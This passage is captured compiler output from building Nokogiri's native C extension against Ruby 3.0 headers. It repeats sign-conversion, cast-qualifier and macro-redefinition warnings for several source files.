            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_element_description.h:4,\n",
            "                 from html_element_description.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_element_description.h:4,\n",
            "                 from html_element_description.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_element_description.h:4,\n",
            "                 from html_element_description.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./html_element_description.h:4,\n",
            "                 from html_element_description.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_element_description.h:4,\n",
            "                 from html_element_description.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/core.h:27,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_element_description.h:4,\n",
            "                 from html_element_description.c:1:\n",
            "html_element_description.c: In function ‘get_description’:\n",
            "html_element_description.c:252:40: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  252 |   return Data_Wrap_Struct(klass, 0, 0, (void *)description);\n",
            "      |                                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rdata.h:83:10: note: in definition of macro ‘Data_Wrap_Struct’\n",
            "   83 |         (sval),                                   \\\n",
            "      |          ^~~~\n",
            "compiling html_entity_lookup.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_entity_lookup.h:4,\n",
            "                 from html_entity_lookup.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_entity_lookup.h:4,\n",
            "                 from html_entity_lookup.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_entity_lookup.h:4,\n",
            "                 from html_entity_lookup.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_entity_lookup.h:4,\n",
            "                 from html_entity_lookup.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_entity_lookup.h:4,\n",
            "                 from html_entity_lookup.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./html_entity_lookup.h:4,\n",
            "                 from html_entity_lookup.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_entity_lookup.h:4,\n",
            "                 from html_entity_lookup.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "html_entity_lookup.c: In function ‘get’:\n",
            "html_entity_lookup.c:18:21: warning: conversion to ‘int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   18 |   args[0] = INT2NUM((long)desc->value);\n",
            "      |                     ^~~~~~~~~~~~~~~~~\n",
            "compiling html_sax_parser_context.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_parser_context.h:4,\n",
            "                 from html_sax_parser_context.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_parser_context.h:4,\n",
            "                 from html_sax_parser_context.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_parser_context.h:4,\n",
            "                 from html_sax_parser_context.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_parser_context.h:4,\n",
            "                 from html_sax_parser_context.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_parser_context.h:4,\n",
            "                 from html_sax_parser_context.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./html_sax_parser_context.h:4,\n",
            "                 from html_sax_parser_context.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_parser_context.h:4,\n",
            "                 from html_sax_parser_context.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "compiling html_sax_push_parser.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_push_parser.h:4,\n",
            "                 from html_sax_push_parser.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_push_parser.h:4,\n",
            "                 from html_sax_push_parser.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_push_parser.h:4,\n",
            "                 from html_sax_push_parser.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_push_parser.h:4,\n",
            "                 from html_sax_push_parser.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_push_parser.h:4,\n",
            "                 from html_sax_push_parser.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./html_sax_push_parser.h:4,\n",
            "                 from html_sax_push_parser.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./html_sax_push_parser.h:4,\n",
            "                 from html_sax_push_parser.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "compiling nokogiri.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from nokogiri.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
